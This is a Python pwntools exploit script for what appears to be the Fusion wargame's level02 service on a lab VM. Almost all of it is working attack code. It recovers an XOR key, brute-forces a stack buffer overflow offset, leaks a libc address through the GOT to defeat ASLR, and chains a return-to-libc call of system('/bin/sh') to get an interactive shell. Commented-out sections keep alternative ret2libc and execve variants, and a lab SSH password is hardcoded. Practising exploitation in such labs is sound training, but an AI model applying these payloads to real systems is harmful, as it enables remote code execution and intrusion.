from pwn import *
from pwnhelper import *
from pwnhelper.dmesg import Dmesg

############################################################################################################################################################
# METHOD DEFINITIONS
############################################################################################################################################################


local_dir = None
remote_binary = None
cloned_binary = None
libc = None
port = None
elf = None


def connect(level):
    global remote_binary
    global local_dir
    global cloned_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/fusion/level"+level
    remote_binary = "/opt/fusion/bin/level"+level
    cloned_binary = local_dir+remote_binary
    port = "200"+level
    s = ssh("fusion", "192.168.2.129", password="godmode", cache=False)
    s.libs(remote_binary, local_dir)
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib/i386-linux-gnu/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s


def extract_size_t(r):
    # extract size from response
    raw_len = r.replace(encrypt_bs, b"")[:4]
    # print("raw size_t:")
    # print(raw_len)
    size_t = unpack(raw_len, 32)
    return size_t


encrypt_bs = b"[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n"
enterprise_bs = b"[-- Enterprise configuration file encryption service --]\n"
buf_fill_char = b"A"

def send_payload(nc, p, verbose=False, restarted=False):

    payload = b""
    payload += b"E"
    payload += pack(len(p), 32)
    payload += p
    print(b"sending: E " + bytes(hex(len(p)), "utf-8") + b" " + p[:10] + b"..." + p[:5])
    if verbose:
        # print("full payload:")
        # print(payload)
        print("length of payload: " + str(len(p)) + " " + hex(len(p)))
    nc.send(payload)

    if restarted:
        entp_bs = nc.recvline()
        if verbose:
            print("enterprise bs:")
            print(entp_bs)
        assert entp_bs == enterprise_bs

    enc_bs = nc.recvline()
    if verbose:
        print("enc bs:")
        print(enc_bs)
    assert enc_bs == encrypt_bs
    # 4 bytes for size
    r = nc.recvn(len(p)+4)

    # if verbose:
    #     print("full response (enc cut off)")
    #     print(r)

    size_t = extract_size_t(r)
    # we cant overflow size, make sure we actually got the size correctly
    assert hex(size_t).count(bytechar_to_raw_hex_string(buf_fill_char)) < 2

    buf = r[4:]
    assert b"encryption" not in buf

    print(b"receiving: " + bytes(hex(size_t), "utf-8") + b" " + buf[:10] + b"..." + buf[:5])

    if verbose:
        print("size_t: " + hex(size_t) + " " + str(size_t))
        print("length of payload: " + str(len(p)) + " " + hex(len(p)))
        print("length of buf: " + str(len(buf)) + " " + hex(len(buf)))

    assert len(buf) == len(p)

    return r, buf, size_t


def send_enc_payload(nc, p, key, verbose=False, restarted=False):
    return send_payload(nc, byte_xor(p, key), verbose=verbose,restarted=restarted)


def byte_xor(ba1, ba2):
    payload_len = len(ba1)
    key_multiple = (int)(payload_len / 128)
    key_multiple = key_multiple + 128
    key = ba2*key_multiple
    return bytes([_a ^ _b for _a, _b in zip(ba1, key)])


# no leading 0x
def bytechar_to_raw_hex_string(bc):
    raw_hex_string = hex(ord(bc)).replace("0x", "")
    # print("raw_hex_string:")
    # print(raw_hex_string)
    return raw_hex_string


s = connect("02")
dmesg = Dmesg(s)

############################################################################################################################################################
# CHECK IF KEY STAYS THE SAME
############################################################################################################################################################

nc = s.process(["nc", "localhost", port])
# Enterprise ...
print(nc.recvline())

buf_size = 32*4

payload = buf_fill_char*buf_size

# print("payload:")
# print(payload)


r, cipher, size_t = send_payload(nc, payload)

# print("cipher:")
# print(cipher)

# print("payload:")
# print(payload)

r, second_cipher, size_t = send_payload(nc, payload)

# print("compare cipher:")
# print(second_cipher)

assert cipher == second_cipher

############################################################################################################################################################
# FIND KEY
############################################################################################################################################################


def find_key(nc, verbose=False, restarted=False):
    buf_size = 32*4
    payload = b"\00"*buf_size

    r, key, size_t = send_payload(nc, payload, verbose=verbose, restarted=restarted)

    assert len(key) == buf_size

    if verbose:
        print("key:")
        print(key)

    return key


key = find_key(nc)
write(local_dir+"/key", key)

crash, report = dmesg.has_segfaulted("level02")
assert not crash

############################################################################################################################################################
# FIND NUM OVERFLOW BYTES UNTIL RET ADR OVERWRITTEN
############################################################################################################################################################

nc.kill()

buf_size = 32 * 4096
overflow_until_ret = 0
# speeding up bc i already know its around 15- 25, it changes tho
# overflow_until_ret = 15
overflow_char = b"B"

while True:

    print("------------------------------------------------------------------------------------------------------")
    print("overflow_until_ret: " + hex(overflow_until_ret) + " " + str(overflow_until_ret))

    payload = b""
    payload += buf_fill_char*buf_size
    payload += overflow_char * overflow_until_ret

    # restart and find new key
    nc = s.process(["nc", "localhost", port])
    key = find_key(nc, verbose=False, restarted=True)

    r, buf, read_size_t = send_enc_payload(nc, payload, key, verbose=False)
    nc.send(b"Q")

    crash, report = dmesg.has_segfaulted("level02")
    if crash:
        print("segfaulted")

        # last_reports = dmesg.get_report(n=10)
        # print("last_reports:")
        # print(last_reports)

        ip = report.ip
        print("ip: " + hex(ip) + " " + str(ip))

        amount_overflowed = hex(ip).count(bytechar_to_raw_hex_string(overflow_char))
        if amount_overflowed != 4:
            # probably overflowed with garbage -> encrypts 4 bytes more
            print("did not overwrite ret adr with full precise value")
            overflow_until_ret += 1
            continue
        else:
            print("overwrote ret adr with precise value")
            # subtract bc we want to stop right before ret adr
            overflow_until_ret = overflow_until_ret - 4
            break
    else:
        overflow_until_ret += 1


############################################################################################################################################################
# RET2LIBC ATTACK SYSTEM "/bin/sh" (LOOKED UP SYSTEM ADR AND BINSH STRING ADR WITH GDB) WORKS
############################################################################################################################################################


# print("overflow_until_ret: " + hex(overflow_until_ret) + " " + str(overflow_until_ret))
# elf = ELF(cloned_binary)
# # system_plt = elf.plt["system"]
# system_adr = 0xb76edb20
# exit_plt = elf.plt["exit"]
#
# print("system: " + hex(system_adr) + " " + str(system_adr))
#
# # find "/bin/sh" string
# bin_sh = 0xb77e98da
#
# payload = b""
# payload += buf_fill_char*buf_size
# payload += overflow_char * overflow_until_ret
# payload += pack(system_adr, 32)
# payload += pack(exit_plt, 32)
# payload += pack(bin_sh)
#
# nc = s.process(["nc", "localhost", port])
# key = find_key(nc, restarted=True)
# r, buf, read_size_t = send_enc_payload(nc, payload, key)
# nc.send(b"Q")
# # now encrypt file should return into libc.system with arg pointer of "/bin/sh"
#
# crash, report = dmesg.has_segfaulted("level02", log=True)
# # assert not crash
#
# shell = check_for_shell(nc)
# if shell:
#     nc.interactive()
#     exit(0)
# else:
#     print("no shell")
#     exit(1)
    
############################################################################################################################################################
# GET STACK ADR AND DO RET2System ATTACK WITH "/bin/sh" ARG IN BUFFER (ONLY LOOKED UP SYSTEM ADR) WORKS
############################################################################################################################################################
# print("overflow_until_ret: " + hex(overflow_until_ret) + " " + str(overflow_until_ret))
#
# sp = report.sp
#
# print("sp: " + hex(sp) + " " + str(sp))
#
# elf = ELF(cloned_binary)
# system_adr = 0xb76edb20
# exit_plt = elf.plt["exit"]
#
# bin_sh = b"/bin/sh\x00"
# # sp points to lower stackframe, bc we already returned from encrypt file adr when crashing
# # -> need to lower adr each iteration
# # need to lower at least size of buf to get to top of buf (in the best case)
# # most likely we start still a little below, thus the loop
# bin_sh_adr = sp - buf_size
# # bin_sh_adr = 0xbf9192c2
#
# while True:
#
#     print("bin_sh_adr: " + hex(bin_sh_adr) + " " + str(bin_sh_adr))
#
#     payload = b""
#     payload += bin_sh
#     payload += buf_fill_char * (buf_size-len(bin_sh))
#     payload += overflow_char * overflow_until_ret
#     payload += pack(system_adr, 32)
#     payload += pack(exit_plt, 32)
#     payload += pack(bin_sh_adr)
#
#     nc = s.process(["nc", "localhost", port])
#     key = find_key(nc, restarted=True)
#     r, buf, read_size_t = send_enc_payload(nc, payload, key)
#     nc.send(b"Q")
#     # now encrypt file should return into libc.system with arg pointer of "/bin/sh"
#     # if the adr of "/bin/sh" is correct (start of buf)
#     # last_reports = dmesg.get_report(n=10)
#     # print("last_reports:")
#     # print(last_reports)
#     crash, report = dmesg.has_segfaulted("level02", log=True)
#     if crash:
#         print("program crashed, incrementing bin_sh_adr")
#         bin_sh_adr -= 1
#         assert report.sp == sp
#         continue
#
#     print("did not crash, maybe shell?")
#     shell = check_for_shell(nc)
#     if shell:
#         nc.interactive()
#         exit(0)
#     else:
#         print("no shell incrementing bin_sh_adr")
#         bin_sh_adr -= 1
#         continue


############################################################################################################################################################
# GET STACK ADR AND DO RET2EXECVE.PLT ATTACK WITH "/bin/sh" ARGS IN BUFFER 
############################################################################################################################################################

# print("*"*100)
# print("overflow_until_ret: " + hex(overflow_until_ret) + " " + str(overflow_until_ret))
#
# sp = report.sp
#
# print("sp: " + hex(sp) + " " + str(sp))
#
# elf = ELF(cloned_binary)
# exit_plt = elf.plt["exit"]
# execve_plt = elf.plt["execve"]
# print("execve_plt: " + hex(execve_plt) + " " + str(execve_plt))
#
#
# # sp points to lower stackframe, bc we already returned from encrypt file adr when crashing
# # -> need to lower adr each iteration
# # need to lower at least size of buf to get to top of buf (in the best case)
# # most likely we start still a little below, thus the loop
# bin_sh = b"/bin/sh\x00"
# l = len(bin_sh)
# bin_sh_adr = sp - buf_size
# # bin_sh_adr = 0xbf9192bc
# null_bytes = b"\x00"*4
#
# while True:
#
#     print("_" * 100)
#     print("bin_sh_adr: " + hex(bin_sh_adr) + " " + str(bin_sh_adr))
#
#     payload = b""
#     payload += bin_sh
#     payload += buf_fill_char*(buf_size-len(payload))
#     payload += overflow_char * overflow_until_ret
#     payload += pack(execve_plt, 32)
#     payload += b"CCCC"  # ret adr of never returning execve
#     payload += pack(bin_sh_adr, 32)
#     payload += null_bytes
#     payload += null_bytes
#
#     nc = s.process(["nc", "localhost", port])
#     key = find_key(nc, restarted=True)
#     r, buf, read_size_t = send_enc_payload(nc, payload, key)
#     nc.send(b"Q")
#     # now encrypt file should return into libc.system with arg pointer of "/bin/sh"
#     # if the adr of "/bin/sh" is correct (start of buf)
#     last_reports = dmesg.get_report(n=10)
#     print("last_reports:")
#     print(last_reports)
#     crash, report = dmesg.has_segfaulted("level02", log=True)
#
#     if crash:
#         print("program crashed -> did not hit right buf_adr decrementing bin_sh_adr")
#         bin_sh_adr -= 1
#         # assert report.sp == sp
#         continue
#
#     print("did not crash, maybe shell?")
#     shell = check_for_shell(nc)
#     if shell:
#         nc.interactive()
#         exit(0)
#     else:
#         print("no shell decrementing bin_sh_adr")
#         bin_sh_adr -= 1

############################################################################################################################################################
# DEFEAT ASLR VIA MEM LEAK AND THEN RET2SystemPLT ATTACK WITH "/bin/sh" ARG IN BUFFER 
############################################################################################################################################################


# print("overflow_until_ret: " + hex(overflow_until_ret) + " " + str(overflow_until_ret))
#
# sp = report.sp
#
# print("sp: " + hex(sp) + " " + str(sp))
#
# elf = ELF(cloned_binary)
# # system_adr = 0xb76edb20
# puts_plt = elf.plt["puts"]
# exit_plt = elf.plt["exit"]
# puts_got_entry_adr = elf.got["puts"]
#
#
# # FIND SYSTEM ADR BY FINDING PUTS REAL ADR AND CALCULATING OFFSET
# payload = b""
# payload += buf_fill_char*buf_size
# payload += overflow_char * overflow_until_ret
# payload += pack(puts_plt, 32)
# payload += pack(exit_plt, 32)
# payload += pack(puts_got_entry_adr, 32)
#
# nc = s.process(["nc", "localhost", port])
# key = find_key(nc, restarted=True)
# r = send_enc_payload(nc, payload, key)
# nc.send(b"Q")
# leaked_puts = unpack(nc.recv(4), 32)
# print("leaked_puts: " + hex(leaked_puts) + " " + str(leaked_puts))
# libc_base = leaked_puts - libc.symbols['puts']
# print("libc_base: " + hex(libc_base) + " " + str(libc_base))
#
# system_adr = libc_base + libc.symbols['system']
#
# print("system_adr: " + hex(system_adr) + " " + str(system_adr))
#
# bin_sh = b"/bin/sh\x00"
# # sp points to lower stackframe, bc we already returned from encrypt file adr when crashing
# # -> need to lower adr each iteration
# # need to lower at least size of buf to get to top of buf (in the best case)
# # most likely we start still a little below, thus the loop
# bin_sh_adr = sp - buf_size
# # bin_sh_adr = 0xbf9192c2
#
# while True:
#
#     print("bin_sh_adr: " + hex(bin_sh_adr) + " " + str(bin_sh_adr))
#
#     payload = b""
#     payload += bin_sh
#     payload += buf_fill_char*(buf_size-len(bin_sh))
#     payload += overflow_char * overflow_until_ret
#     payload += pack(system_adr, 32)
#     payload += pack(exit_plt, 32)
#     payload += pack(bin_sh_adr)
#
#     nc = s.process(["nc", "localhost", port])
#     key = find_key(nc, restarted=True)
#     r, buf, read_size_t = send_enc_payload(nc, payload, key)
#     nc.send(b"Q")
#     # now encrypt file should return into libc.system with arg pointer of "/bin/sh"
#     # if the adr of "/bin/sh" is correct (start of buf)
#     # last_reports = dmesg.get_report(n=10)
#     # print("last_reports:")
#     # print(last_reports)
#     crash, report = dmesg.has_segfaulted("level02", log=True)
#     if crash:
#         print("program crashed, incrementing bin_sh_adr")
#         bin_sh_adr -= 1
#         assert report.sp == sp
#         continue
#
#     print("did not crash, maybe shell?")
#     shell = check_for_shell(nc)
#     if shell:
#         nc.interactive()
#         exit(0)
#     else:
#         print("no shell incrementing bin_sh_adr")
#         bin_sh_adr -= 1
#         continue

############################################################################################################################################################
# GET ASLR OFFSET AND USE TO FIND SYSTEM AND /BIN/SH ADR'S THEN RET2LIBC
############################################################################################################################################################

print("overflow_until_ret: " + hex(overflow_until_ret) + " " + str(overflow_until_ret))


puts_plt = elf.plt["puts"]
exit_plt = elf.plt["exit"]
puts_got_entry_adr = elf.got["puts"]


# FIND SYSTEM ADR BY FINDING PUTS REAL ADR AND CALCULATING OFFSET
payload = b""
payload += buf_fill_char*buf_size
payload += overflow_char * overflow_until_ret
payload += pack(puts_plt, 32)
payload += pack(exit_plt, 32)
payload += pack(puts_got_entry_adr, 32)

nc = s.process(["nc", "localhost", port])
key = find_key(nc, restarted=True)
r = send_enc_payload(nc, payload, key)
nc.send(b"Q")
leaked_puts = unpack(nc.recv(4), 32)
print("leaked_puts: " + hex(leaked_puts) + " " + str(leaked_puts))
libc_base = leaked_puts - libc.symbols['puts']
print("libc_base: " + hex(libc_base) + " " + str(libc_base))

system_adr = libc_base + libc.symbols['system']
bin_sh_adr = libc_base + next(libc.search(b"/bin/sh"))

print("system_adr: " + hex(system_adr) + " " + str(system_adr))
print("bin_sh_adr: " + hex(bin_sh_adr) + " " + str(bin_sh_adr))

bin_sh = b"/bin/sh\x00"


payload = b""
payload += bin_sh
payload += buf_fill_char*(buf_size-len(bin_sh))
payload += overflow_char * overflow_until_ret
payload += pack(system_adr, 32)
payload += pack(exit_plt, 32)
payload += pack(bin_sh_adr)

nc = s.process(["nc", "localhost", port])
key = find_key(nc, restarted=True)
r, buf, read_size_t = send_enc_payload(nc, payload, key)
nc.send(b"Q")
crash, report = dmesg.has_segfaulted("level02", log=True)
assert not crash
shell = check_for_shell(nc)
if shell:
    nc.interactive()
    exit(0)
else:
    exit(1)